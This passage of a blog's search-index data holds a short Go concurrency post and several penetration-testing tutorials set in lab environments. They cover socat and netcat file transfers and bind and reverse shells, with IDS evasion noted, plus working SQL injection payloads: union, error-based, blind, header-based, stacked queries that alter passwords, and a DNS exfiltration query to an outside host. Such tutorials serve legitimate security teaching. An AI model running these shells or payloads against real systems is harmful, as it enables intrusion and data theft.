Function","slug":"Go/Closure-and-Anonymous-Function","permalink":"http://example.com/categories/Go/Closure-and-Anonymous-Function/"}],"tags":[]},{"title":"A Brief Summary of \"go func()\"","slug":"goFunc","date":"2018-11-17T04:00:34.000Z","updated":"2023-10-23T14:48:54.676Z","comments":true,"path":"2018/11/16/goFunc/","link":"","permalink":"http://example.com/2018/11/16/goFunc/","excerpt":"","text":"“go func()” is a way in the Go programming language to launch new concurrent goroutines. A goroutine is a lightweight thread in Go used for concurrent task execution. Using “go func()” allows you to create new concurrent execution flows in your program without the need to explicitly create threads or manage the complexity of thread management. Here is a basic example and some key concepts of using “go func()”: Basic Example: 1234567func main() &#123; go func() &#123; // Place the code you want to execute in a new concurrent goroutine here &#125;() // The main goroutine continues to execute other work&#125; In the example above, “go func()” starts a concurrent goroutine for an anonymous function, which will execute the code inside it. The main goroutine continues to execute other tasks, while the new concurrent goroutine runs in the background. Key Concepts: Anonymous Function: Anonymous functions are typically used to define “go func()” because there’s no need to name the concurrent goroutine. The code for the anonymous function can be enclosed in {} as needed. Concurrent Execution: Goroutines launched with “go func()” run concurrently in the background without blocking the main program’s execution. This allows you to execute multiple tasks simultaneously, improving program performance. Data Sharing: Concurrent goroutines can share data, but it’s important to handle shared data carefully to avoid race conditions and data races. You can use tools provided by the “sync” package to manage access to shared data. Goroutine Management: Go’s runtime system is responsible for creating, scheduling, and destroying goroutines. You don’t need to worry about the complexity of thread creation and destruction. Waiting for Goroutines to Complete: If you need to wait for concurrent goroutines to finish, you can use mechanisms like “sync.WaitGroup” or channels to implement waiting. Using “go func()” is a simple way to achieve concurrency in the Go programming language, allowing you to run tasks in parallel, such as handling concurrent requests, performing background tasks, or other work that needs to execute simultaneously. However, be cautious about handling concurrency issues and ensuring that shared data is synchronized and accessed correctly.","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"go func()","slug":"Go/go-func","permalink":"http://example.com/categories/Go/go-func/"}],"tags":[{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"}]},{"title":"Socat","slug":"Pentest-socat","date":"2016-12-06T00:26:27.000Z","updated":"2023-10-21T22:00:20.508Z","comments":true,"path":"2016/12/05/Pentest-socat/","link":"","permalink":"http://example.com/2016/12/05/Pentest-socat/","excerpt":"","text":"Socat is a command-line utility that establishes two bidirectional byte streams and transfers databetween them. For penetration testing, it is similar to Netcat but has additional useful features. While there are a multitude of things that socat can do, we will only cover a few of them to illustrateits use. Socat File TransfersServer side: 12┌──(root㉿kali)-[/home/kali/Desktop]└─# socat TCP4-LISTEN:443,fork file:nmap-list.txt Client side: 123456C:\\Users\\Administrator\\Desktop\\socat&gt; socat TCP4:192.168.244.140:443 file:nmap-list.txt ,createC:\\Users\\Administrator\\Desktop\\socat&gt; type nmap-list.txtStarting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 23:19 EDTWarning: 199.241.133.26 giving up on port because retransmission cap hit (10).Stats: 0:07:04 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan... Socat Reverse ShellsServer side: 12C:\\Users\\Administrator\\Desktop\\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT... socat[5640] N listening on AF=2 0.0.0.0:443 Client side:When client side type follow command : 12┌──(root㉿kali)-[/home/kali/Desktop]└─# socat TCP4:192.168.244.140:443 EXEC:/bin/bash Then the server side , look like: 123456789C:\\Users\\Administrator\\Desktop\\socat&gt; socat -d -d TCP4-LISTEN:443 STDOUT... socat[5640] N listening on AF=2 0.0.0.0:443... socat[5640] N accepting connection from AF=2 192.168.244.140:54720 on 192.168.244.144:443... socat[5640] N using stdout for reading and writing... socat[5640] N starting data transfer loop with FDs [4,4] and [1,1]whoamirootiduid=0(root) gid=0(root) groups=0(root) Socat Encrypted Bind ShellsTo add encryption to a bind shell, we will rely on Secure Socket Layer certificates. This level ofencryption will assist in evading intrusion detection systems (IDS) and will help hide the sensitivedata we are transceiving.To continue with the example, we will use the openssl application to create a selfsigned certificate using the following options:• req: initiate a new certificate signing request• -newkey: generate a new private key• rsa:2048: use RSA encryption with a 2,048-bit key length.• -nodes: store the private key without passphrase protection• -keyout: save the key to a file• -x509: output a self-signed certificate instead of a certificate request• -days: set validity period in days• -out: save the certificate to a file Once we generate the key, we will cat the certificate and its private key into a file, which we willeventually use to encrypt our bind shell. Server side: 12345678910111213141516171819202122232425┌──(root㉿kali)-[/home/kali/Desktop]└─# openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crtou are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter &#x27;.&#x27;, the field will be left blank.-----Country Name (2 letter code) [AU]:CAState or Province Name (full name) [Some-State]:QuebecLocality Name (eg, city) []:MontrealOrganization Name (eg, company) [Internet Widgits Pty Ltd]:RaohuaOrganizational Unit Name (eg, section) []:Try Harder DepartmentCommon Name (e.g. server FQDN or YOUR name) []:Email Address []: ┌──(root㉿kali)-[/home/kali/Desktop]└─# cat bind_shell.key bind_shell.crt &gt; bind_shell.pem ┌──(root㉿kali)-[/home/kali/Desktop]└─# socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash Client side: 123456789101112131415161718192021C:\\Users\\Administrator\\Desktop\\socat&gt; socat - OPENSSL:192.168.244.140:443,verify=0iduid=0(root) gid=0(root) 0=1000(root)whoamirootip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 00:0c:29:f9:b4:b9 brd ff:ff:ff:ff:ff:ff inet 192.168.244.140/24 brd 192.168.244.255 scope global dynamic noprefixroute eth0 valid_lft 1168sec preferred_lft 1168sec inet6 fe80::9d6e:bd4e:a4b2:6ffb/64 scope link noprefixroute valid_lft forever preferred_lft forever3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:1d:28:b9:62 brd ff:ff:ff:ff:ff:ff","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"Practical Tools","slug":"Penetration-Test/Practical-Tools","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/"},{"name":"Socat","slug":"Penetration-Test/Practical-Tools/Socat","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/Socat/"}],"tags":[]},{"title":"Netcat","slug":"Pentest-nc","date":"2016-12-02T04:04:37.000Z","updated":"2023-10-21T22:00:01.691Z","comments":true,"path":"2016/12/01/Pentest-nc/","link":"","permalink":"http://example.com/2016/12/01/Pentest-nc/","excerpt":"","text":"Netcat first released in 1995(!) by Hobbit is one of the “original” network penetration testingtools and is so versatile that it lives up to the author’s designation as a hacker’s “Swiss army knife”.The clearest definition of Netcat is from Hobbit himself: a simple “utility which reads and writesdata across network connections, using TCP or UDP protocols. Connecting to a TCP&#x2F;UDP Port We can use client mode to connect to any TCP&#x2F;UDP port, allowing us to:• Check if a port is open or closed.• Read a banner from the service listening on a port.• Connect to a network service manually. Example: 1nc -nv 10.11.10.2 110 -n option to skip DNS name resolution;-v to add some verbosity; Output: 12345678(UNKNOWN) [10.11.10.2] 110 (pop3) open+OK Dovecot ready.USER offsec+OKPASS offsec-ERR [AUTH] Authentication failed.quit+OK Logging out Listening on a TCP&#x2F;UDP Port Example: First , server start listening: 123//From server : msfadmin@metasploitable:~$ nc -nlvp 4444listening on [any] 4444 ... Then client try to connect server,and send “hello world”: 12345//From client : ┌──(root㉿kali)-[/home/kali/Desktop]└─# nc -nv 192.168.244.136 4444(UNKNOWN) [192.168.244.136] 4444 (?) openhello world The server will receive message “hello world”: 12345//From server : msfadmin@metasploitable:~$ nc -nlvp 4444listening on [any] 4444 ...connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 47386hello world Transferring Files with Netcat From Server: 123//From server : C:\\Users\\Administrator\\Desktop\\nc&gt; nc -nlvp 4444 &gt; mync.exelistening on [any] 4444 ... From client : 1234//From client : ┌──(root㉿kali)-[/home/kali/Desktop]└─# nc -nv 192.168.244.143 4444 &lt; /home/kali/Desktop/nc.exe (UNKNOWN) [192.168.244.143] 4444 (?) open Notice that we have not received any feedback from Netcat about our file upload progress. In thiscase, since the file we are uploading is small, we can just wait a few seconds, then check whetherthe file has been fully uploaded to the Windows machine by attempting to run it: 1234567891011C:\\Users\\Administrator\\Desktop\\nc&gt;mync -h[v1.10-47]connect to somewhere: nc [-options] hostname port[s] [ports] ... listen for inbound: nc -l -p port [-options] [hostname] [port]options: -c shell commands as `-e&#x27;; use /bin/sh to exec [dangerous!!] -e filename program to exec after connect [dangerous!!] -b allow broadcasts ...port numbers can be individual or ranges: lo-hi [inclusive];hyphens in port names must be backslash escaped (e.g. &#x27;ftp\\-data&#x27;). Netcat Bind Shell Scenario Run Netcat with the -e option to execute cmd.exe once a connection is made to the listening port: 12C:\\Users\\Administrator\\Desktop\\nc&gt; nc -nlvp 4444 -e cmd.exelistening on [any] 4444 ... Client: 1234567891011121314151617181920212223242526┌──(root㉿kali)-[/home/kali/Desktop]└─# nc -nv 192.168.244.143 4444 (UNKNOWN) [192.168.244.143] 4444 (?) openMicrosoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Users\\Administrator\\Desktop\\netcat-1.11&gt;ipconfigipconfigWindows IP ConfigurationEthernet adapter Local Area Connection: Connection-specific DNS Suffix . : localdomain Link-local IPv6 Address . . . . . : fe80::6d45:b51c:b367:2f09%11 IPv4 Address. . . . . . . . . . . : 192.168.244.143 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 192.168.244.2Tunnel adapter isatap.localdomain: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : localdomainC:\\Users\\Administrator\\Desktop\\netcat-1.11&gt; This is indeed a “gaping security hole”! Reverse Shell ScenarioServer:12C:\\Users\\Administrator\\Desktop\\nc&gt; nc -nlvp 4444 -e cmd.exelistening on [any] 4444 ... Client: 123┌──(root㉿kali)-[/home/kali/Desktop]└─# nc -nv 192.168.244.143 4444 (UNKNOWN) [192.168.244.143] 4444 (?) open Then server side shows like: 123456789C:\\Users\\Administrator\\Desktop\\nc&gt; nc -nlvp 4444 -e cmd.exelistening on [any] 4444 ...connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 35156lscode.desktopnc.exeip address show eth0 | grep inetinet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"Practical Tools","slug":"Penetration-Test/Practical-Tools","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/"},{"name":"Netcat","slug":"Penetration-Test/Practical-Tools/Netcat","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/Netcat/"}],"tags":[]},{"title":"MySQL Stack-Based SQL Injection","slug":"SQLInjectionMySQLStackBased","date":"2016-11-30T04:22:05.000Z","updated":"2023-10-19T15:36:07.842Z","comments":true,"path":"2016/11/29/SQLInjectionMySQLStackBased/","link":"","permalink":"http://example.com/2016/11/29/SQLInjectionMySQLStackBased/","excerpt":"","text":"In SQL, a semicolon represents the end of one SQL statement, while stack-based injection involves executing multiple SQL statements together. Stack-based injection is different from other injection techniques and has limitations. 12%27 --- &#x27;%20 --- space How can you find the table fields and table names of the other party? Look for exploitable files using directory traversal vulnerabilities, such as files with a .sql extension. Use directory&#x2F;file fuzzing tools like Dirsearch, etc., to search for .sql files. Search for source code leakage vulnerabilities on the other party’s website; the source code may contain exploitable files. Search for the other party’s website source code on GitHub. Example: 12345http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27; //You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1 http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;; // it&#x27;s okhttp://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;;create table aa like users; //create a table named aa, structure like table usershttp://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;;drop table aa--+http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;;update users set password =&#x27;admin@1234&#x27; where username=&#x27;admin&#x27;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"MySQL Stack-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection/"}],"tags":[]},{"title":"HTTP Header SQL Injection","slug":"SQLInjectionHttpHeader","date":"2016-11-26T02:11:31.000Z","updated":"2023-10-19T15:20:17.106Z","comments":true,"path":"2016/11/25/SQLInjectionHttpHeader/","link":"","permalink":"http://example.com/2016/11/25/SQLInjectionHttpHeader/","excerpt":"","text":"HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. This can have various security implications, including the potential for cross-site scripting (XSS) attacks or other forms of web application exploitation. Example : 12345678910111213141516POST /sqli-labs-master/Less-18/ HTTP/1.1Host: 192.168.1.33Content-Length: 38Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.1.33Content-Type: application/x-www-form-urlencodedUser-Agent:1&#x27; and updatexml(1,concat(0x7e,(user()),0x7e),1) and &#x27;1&#x27;=&#x27;1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://192.168.1.33/sqli-labs-master/Less-18/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closeuname=admin&amp;passwd=admin&amp;submit=Submit 1XPATH syntax error: &#x27;~root@localhost~&#x27;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"HTTP Header SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection/"}],"tags":[]},{"title":"MySQL Error-Based SQL Injection","slug":"SQLInjectionMySQLError","date":"2016-11-23T01:55:15.000Z","updated":"2023-10-19T15:20:20.371Z","comments":true,"path":"2016/11/22/SQLInjectionMySQLError/","link":"","permalink":"http://example.com/2016/11/22/SQLInjectionMySQLError/","excerpt":"","text":"Overview Error-Based Injection involves deliberately triggering error conditions in the database to make query results appear in error messages. This technique is particularly useful in cases where UNION-based injections are restricted and error information can be returned. It’s also known as Formulaic SQL Injection. Utilizing the updatexml() function: Payload: 1?id=1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1));--+ 0x7e: ~updatexml(): Function used to update XML documents.updatexml() syntax: update(target_xml_document, xpath_expression, new_value)XPath expressions are used to specify paths within an XML document. If the format is incorrect, an error will occur. Subsequent steps for updatexml-based error-based injection: (1). Modify the SQL statement for selecting the user position.(2). Retrieve tables in the current database.(3). Retrieve columns of a specific table.(4). Continue step by step. Utilizing the extravalue() function: Payload: 1?id=1&#x27; and (extravalue(1,concat(0x7e,(select user()),0x7e)))--+ extravalue() function is similar to updatexml() and is used for querying node content in an XML document.Subsequent steps for extravalue-based error-based injection are the same as for updatexml. Utilizing the floor() function: Payload: 1?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ The principle utilized is the repetition of primary keys due to the repetitiveness of floor(rand(0)*2), leading to an error in the group by statement.The group by key principle involves looping through every row of data and saving the results in a temporary table. When reading each row’s key, if the key exists in the temporary table, it won’t update the temporary table’s data. If the key doesn’t exist, it will insert the key’s row data into the temporary table. Additional Information: These three functions are commonly used in error-based injections.","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"MySQL Error-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection/"}],"tags":[]},{"title":"DNS Log Blind SQL Injection","slug":"SQLInjectionDnsLog","date":"2016-11-18T15:47:59.000Z","updated":"2023-10-19T14:53:51.423Z","comments":true,"path":"2016/11/18/SQLInjectionDnsLog/","link":"","permalink":"http://example.com/2016/11/18/SQLInjectionDnsLog/","excerpt":"","text":"Sometimes, when injecting, you may not get direct feedback, or you may not be able to use time-based blind injection. In such cases, you can use out-of-band channels, which means using other protocols or channels, such as HTTP requests, DNS resolution, SMB services, to exfiltrate data. DNS log blind injection can reduce the number of requests sent and achieve injection with direct feedback. DNS log: It stores domain name information on the DNS server, recording user access information for domains like www.xxx.com. Conditions for utilization: secure_file_priv in mysql.ini must be empty. If secure_file_priv is null, importing and exporting are not allowed. If secure_file_priv is set to &#x2F;tmp, importing and exporting can only be done in the &#x2F;tmp directory. When secure_file_priv is empty, there are no restrictions, and importing and exporting are allowed. Example: 1?id=1&#x27; and load_file(concat(&#x27;\\\\&#x27;, (select database()), &#x27;.27epx0.ceye.io\\abc&#x27;))--+&quot;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"DNS Log Blind SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection/"}],"tags":[]},{"title":"Time-Based Blind SQL Injection","slug":"SQLInjectionTimeBasedBlind","date":"2016-10-29T02:31:42.000Z","updated":"2023-10-19T00:37:49.750Z","comments":true,"path":"2016/10/28/SQLInjectionTimeBasedBlind/","link":"","permalink":"http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/","excerpt":"","text":"Time-Based Blind SQL Injection Steps: First, check if an injection vulnerability exists. Next, determine the injection type: character-based, numeric-based, or search-based. Determine the available injection method; in this case, union injection and Boolean-based blind injection are not available:123?id=1&#x27; and 1=1 %23 (Page response is normal)?id=1&#x27; and 1=2 %23 (Page response is normal)?id=1&#x27; and sleep(5) %23 Page experiences a 5-second delay, indicating the sleep function is injected into the database, confirming the presence of time-based blind injection. Start by obtaining the length of the database name:12?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 (5-second delay)?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 (No 5-second delay) This indicates that the database name has a length of 8 characters. Proceed to retrieve the database name character by character:1?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;n),sleep(5),1) %23 These steps describe a method for performing time-based blind SQL injection to extract information about the database, such as the length of the database name and the characters that make up the name. Example of Time-Based Blind SQL Injection Operation:123456789101112http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; 没有任何反应http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot; 没有任何反应http://127.0.0.1/sqli-labs-master/Less-9/?id=1\\ 没有任何反应http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and 1=1 --+ 没有任何反应http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and sleep(5) %23 5秒钟后响应,说明是字符型盲注http://127.0.0.1/sqli-labs-master/Less-9/?id=1 and sleep(5) %23 响应的比较快,说明不是数字型盲注http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 延时5秒http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 不延时5秒http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;114),sleep(5),1) %23 延时5秒http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;115),sleep(5),1) %23 不延时5秒,得出结论,第一个字符是s,以此类推http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;3,sleep(5),1) --+ 延时5秒http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;4,sleep(5),1) --+ 不延时5秒","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Time-Based Blind SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection/"}],"tags":[]},{"title":"Boolean Blind SQL Injection","slug":"SQLInjectionBooleanBlind","date":"2016-10-28T00:20:57.000Z","updated":"2023-10-19T00:29:50.667Z","comments":true,"path":"2016/10/27/SQLInjectionBooleanBlind/","link":"","permalink":"http://example.com/2016/10/27/SQLInjectionBooleanBlind/","excerpt":"","text":"Boolean Blind SQL Injection Method First, obtain the length of the database name: 1?id=1&#x27; and (length(database()))&gt;n --+ Next, retrieve the database name character by character: 1?id=1&#x27; and (ascii(substr(database(),1,1))&gt;n) --+ Note: To determine the character at a specific position, you can use a binary search method.To obtain the second character of the database name, simply change the position in the “substr” function. Use Burp Suite’s Intruder module to iterate through the possibilities. Obtain the number of tables: 1?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3 Retrieve the length of the tables.These steps outline a method for conducting a blind Boolean-based SQL injection to gather information about a database, such as the database name and the number of tables. Example of Boolean Blind SQL Injection Operation1234567891011121314http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=1 --+ correcthttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=2 --+ errorhttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 3 --+ correcthttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 4 --+ errorhttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; union select 1,2,3 --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;7 --+ correct database name&#x27;s length &lt;=8http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;8 --+ errorhttp://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;114) --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;115) --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3 --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 4 --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 100) --+http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 101) --+","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Boolean Blind Sql Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection/"}],"tags":[]},{"title":"Union Sql Injection Detection Methods","slug":"SQLInjectionUnion","date":"2016-10-24T23:11:44.000Z","updated":"2023-10-19T00:46:23.925Z","comments":true,"path":"2016/10/24/SQLInjectionUnion/","link":"","permalink":"http://example.com/2016/10/24/SQLInjectionUnion/","excerpt":"","text":"Union Sql Injection Detection Methods First, check for the existence of an SQL injection vulnerability. Then, determine the injection type: character-based, numeric-based, or search-based. Use “order by” to further identify the number of columns:12?id=1&#x27; order by 3 --+ (normal)?id=1&#x27; order by 4 --+ (error) Once the number of columns is determined using “order by,” proceed to replace the display position with some MySQL functions. Retrieve the tables in the current database:1?id=-1&#x27; union select 1, group_concat(&#x27;&lt;br&gt;&#x27;, table_name), version() from information_schema.tables where table_schema=database()--+ After obtaining the tables, retrieve the columns in those tables:1?id=-1&#x27; union select 1, group_concat(&#x27;&lt;br&gt;&#x27;, column_name), version() from information_schema.columns where able_schema=database() and table_name=&#x27;users&#x27;--+ Retrieve the data:1?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;, username), group_concat(&#x27;|&#x27;, password) from users--+ These steps describe how an attacker can detect and exploit a SQL injection vulnerability to extract information from a database. Example of Union Sql Injection Operation123456789http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+ correcthttp://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+ errorhttp://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version() --+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;&lt;br&gt;&#x27;,table_name) ,version() from information_schema.tables where table_schema=database()--+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;&lt;br&gt;&#x27;,column_name),version() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, username,password from users --+http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;,username),group_concat(&#x27;|&#x27;,password) from users --+","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Union Sql Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/"}],"tags":[]},{"title":"Search-Based SQL Injection Detection","slug":"SQLInjectionSearch-Based","date":"2016-10-23T23:57:41.000Z","updated":"2023-10-18T22:54:24.993Z","comments":true,"path":"2016/10/23/SQLInjectionSearch-Based/","link":"","permalink":"http://example.com/2016/10/23/SQLInjectionSearch-Based/","excerpt":"","text":"Search-Based Injection Detection Methods: Input the search keyword: 1keyword&#x27; If an error occurs, there’s a high probability of a vulnerability. Input the search keyword: 1keyword%&#x27; If an error occurs, there’s a high probability of a vulnerability. Input the search keyword: 1keyword% &#x27;and 1=1 and &#x27;%&#x27;=&#x27; Observe the response. Input the search keyword: 1keyword% &#x27;and 1=2 and &#x27;%&#x27;=&#x27; Observe the response. Search-Based Injection Detection Statements: 123&#x27;and 1=1 and &#x27;%&#x27;=&#x27;%&#x27; and 1=1--&#x27;%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"Search-Based SQL 